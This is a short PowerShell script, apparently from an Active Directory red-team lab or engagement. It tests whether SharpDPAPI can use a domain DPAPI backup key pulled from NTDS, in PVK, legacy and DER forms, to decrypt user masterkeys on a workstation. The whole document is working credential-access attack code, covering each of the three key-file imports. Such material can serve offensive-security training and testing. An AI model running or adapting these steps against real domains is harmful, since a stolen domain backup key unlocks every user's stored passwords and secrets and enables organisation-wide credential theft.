# 3.5G retry - Step A: does CRTE SharpDPAPI import our domain DPAPI backup key (PVK/legacy)?
# Test on ws01 with analyst_t1's own profile (import success/failure is the observable)
$ErrorActionPreference = 'Continue'
$sdp = 'C:\Tools\ADTools\CRTE-2026\SharpDPAPI.exe'
$pvk = 'C:\Tools\ADTools\ntds_capi_0_73eeb965-bf4b-4e9a-8e3e-1814df83d602.keyx.rsa.pvk'
$leg = 'C:\Tools\ADTools\ntds_legacy_0_71f6589e-3a97-4e59-98ac-fa67b70fcd7c.key'
$der = 'C:\Tools\ADTools\ntds_capi_0_73eeb965-bf4b-4e9a-8e3e-1814df83d602.der'

Write-Output "=== PVK import test: masterkeys /pvk ==="
& $sdp masterkeys /pvk:$pvk 2>&1 | ForEach-Object { Write-Output "PVK|$_" }

Write-Output ''
Write-Output "=== LEGACY key import test ==="
& $sdp masterkeys /pvk:$leg 2>&1 | ForEach-Object { Write-Output "LEG|$_" }

Write-Output ''
Write-Output "=== DER import test ==="
& $sdp masterkeys /pvk:$der 2>&1 | ForEach-Object { Write-Output "DER|$_" }

Write-Output 'STEP_A_DONE'
